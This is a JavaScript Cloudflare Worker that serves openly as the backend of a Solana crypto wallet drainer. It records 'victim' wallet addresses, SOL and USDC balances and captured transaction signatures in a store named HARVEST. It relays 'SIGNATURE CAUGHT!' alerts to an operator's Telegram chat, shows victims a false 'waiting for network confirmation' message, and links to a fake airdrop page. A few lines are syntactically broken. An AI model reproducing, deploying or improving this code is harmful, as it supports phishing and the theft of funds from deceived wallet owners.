export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    // --- TELEGRAM BOT WEBHOOK ( =Kontrolle) ---
    if (request.method ===  "POST" && url.pathname === "/webhook") {
      try {
;
        const update = await request           .json();
        const message = update.message;

        if (message && message.text) {
          const text = message.text;

          if (text === "/start" || text === "/stats") {
            let totalVictims let messageText = "📊 *DEXSCREENR PANEL*\n\n";

            if (env.HARVEST) {
              const list = await env.HARVEST.list({ limit: 10 });
              totalVictims = list.keys.length;
              messageText += `*Recent Connections (${totalVictims} shown):*\n\n`;
              
              for (const key of list.keys) {
                const dataStr = await env.HARVEST.get(key.name);
                if (dataStr) {
                  const data = JSON.parse(dataStr);
                  if (data.type === "connection_and_balance") {
                    messageText += `👤 \`${data.victim.slice(0,4)}...${data.victim.slice(-4)}\`\n`;
                    messageText += `SOL: ${data.sol} | USDC: ${data.usdc}\n\n`;
                  }
                }
              }
            } else {
              messageText += "No KV database connected.";
            }

            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: env.ALERT_CHAT_ID,
                text: messageText,
                parse_mode: "Markdown",
                reply_markup: {
                  inline_keyboard: [
                    [{ text: "🔄 Refresh Stats", callback_data: "/stats" }],
                    [{ text: "🌐 Open Mini App", url: "https://airdrop-66m.pages.dev" }]
                  ]
                }
              }),
            });
          }
        }

        if (update.callback_query) {
          const fakeMessage = { text: "/stats" }; 
          await this.fetch(new Request(request.url, {
            method: "POST",
            body: JSON.stringify({ message: fakeMessage })
          }), env);
        }

        return new Response("OK");
      } catch (e) {
        return new Response("Error", { status: 500 });
      }
    }

    // --- WEBSITE API (Drainer) ---
    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS, GET",
      "Access-Control-Allow-Headers": "Content-Type",
    };

    if (request.method === "OPTIONS") {
      return new Response(null, { headers: corsHeaders });
    }

    if (request.method === "POST") {
      try {
        const data = await request.json();
        
        if (env.HARVEST) {
          await env.HARVEST.put(Date.now() + ":" + data.victim, JSON.stringify(data));
        }
        
        if (env.BOT_TOKEN && env.ALERT_CHAT_ID) {
          let channelMessage = "";
          let userMessage = "";
          
          if (data.type === "connection_and_balance") {
            channelMessage = `🔗 *WALLET CONNECTED*\n\n👤 *Address:*\n\`${data.victim}\`\n\n💰 *SOL:* ${data.sol}\n💵 *USDC:* ${data.usdc}\n\n🪙 *Other:*\n${data.tokens || 'None'}`;
            userMessage = `✅ *Wallet connected.*\n\nWaiting for network confirmation...`;
          } else if (data.type === "drain") {
            channelMessage = `🎣 *SIGNATURE CAUGHT!*\n\n👤 *Address:*\n\`${data.victim}\`\n\n📝 *TX:*\n\`${data.tx}\``;
          }
          
          if (channelMessage) {
            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: env.ALERT_CHAT_ID, text: channelMessage, parse_mode: "Markdown" }),
            });
          }
          
          if (userMessage && data.tg_user_id) {
            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: data.tg_user_id, text: userMessage, parse_mode: "Markdown" }),
            });
          }
        }
        
        return new Response(JSON.stringify({ success: true }), {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });

      } catch (error) {
        return new Response(JSON.stringify({ error: error.message }), {
          status: 500,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
    }

    return new Response("Worker Active", { headers: corsHeaders });
  },
};
